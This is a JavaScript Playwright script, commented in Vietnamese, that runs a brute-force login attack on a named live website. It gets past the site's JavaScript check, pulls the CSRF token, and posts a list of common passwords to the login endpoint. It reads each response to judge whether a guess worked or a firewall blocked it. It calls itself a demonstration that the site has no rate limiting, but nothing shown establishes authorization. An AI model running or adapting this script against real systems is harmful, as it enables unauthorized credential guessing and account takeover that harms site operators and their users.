// attack_script.js (Version 3 - Robust Response Handling)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com';
const LOGIN_API_URL = `${TARGET_URL}/login_post`;
const EMAIL_TEST = 'attacker@test.com';
const PASSWORDS = ["123456", "password", "admin", "123123", "qwerty", "certapple"];
// --- Kết thúc cấu hình ---

(async () => {
  console.log('::group::Khởi chạy trình duyệt headless (Chrome)...');
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  console.log('Trình duyệt đã sẵn sàng.');
  console.log('::endgroup::');

  try {
    console.log(`::group::Truy cập ${TARGET_URL} để lấy cookie và CSRF token...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Vượt qua lớp bảo vệ JavaScript thành công!');

    const csrfToken = await page.locator('meta[name="csrf-token"]').getAttribute('content');
    if (!csrfToken) {
      console.error('::error::Không thể lấy được CSRF token sau khi đã tải trang bằng Playwright.');
      process.exit(1);
    }
    console.log(`✅ Lấy được CSRF Token: ${csrfToken}`);
    console.log('::endgroup::');

    console.log('::group::Bắt đầu mô phỏng tấn công Brute-Force vào API...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và danh sách ${PASSWORDS.length} mật khẩu.`);

    for (const pass of PASSWORDS) {
      console.log('------------------------------------');
      console.log(`Đang thử mật khẩu: ${pass}`);

      const response = await page.request.post(LOGIN_API_URL, {
        // Tắt việc tự động theo dõi redirect để xem phản hồi gốc
        // Tuy nhiên, trong trường hợp này, chúng ta muốn xem trang cuối cùng mà server trả về
        form: {
          email: EMAIL_TEST,
          password: pass,
          _token: csrfToken,
        }
      });

      // --- THAY ĐỔI QUAN TRỌNG ---
      // Lấy phản hồi dưới dạng TEXT thay vì JSON
      const responseText = await response.text();

      // Kiểm tra nội dung của TEXT để xác định kết quả
      // Đây là cách làm giống hệt như một hacker sẽ phân tích phản hồi
      if (responseText.includes('Tài khoản hoặc mật khẩu không đúng')) {
        console.log("Thất bại. Server đã trả về trang HTML chứa thông báo lỗi đăng nhập.");
      } else if (!responseText.includes('csrf-token')) {
        // Nếu đăng nhập thành công, thường sẽ được chuyển đến trang dashboard không còn csrf-token của trang login
        console.error(`::error::TẤN CÔNG CÓ THỂ ĐÃ THÀNH CÔNG với mật khẩu '${pass}'!`);
        console.error("Server đã trả về một trang khác, có thể là trang dashboard sau khi đăng nhập.");
        console.error("Nội dung phản hồi:", responseText.substring(0, 500) + "..."); // In ra 500 ký tự đầu để xem
        process.exit(1);
      } else {
        // Nếu vẫn là trang đăng nhập nhưng không có thông báo lỗi, có thể là WAF đã chặn
        console.warn("::warning::Phản hồi không xác định. Có thể WAF đã chặn hoặc có lỗi khác.");
        console.warn("Nội dung phản hồi:", responseText.substring(0, 500) + "...");
      }
      // --- KẾT THÚC THAY ĐỔI ---
    }
    console.log('------------------------------------');
    console.log('✅ Hoàn thành demo tấn công. Việc server phản hồi liên tục cho thấy KHÔNG có cơ chế Rate Limiting.');
    console.log('::endgroup::');

  } catch (error) {
    console.error('::error::Đã xảy ra lỗi trong quá trình tấn công:', error);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
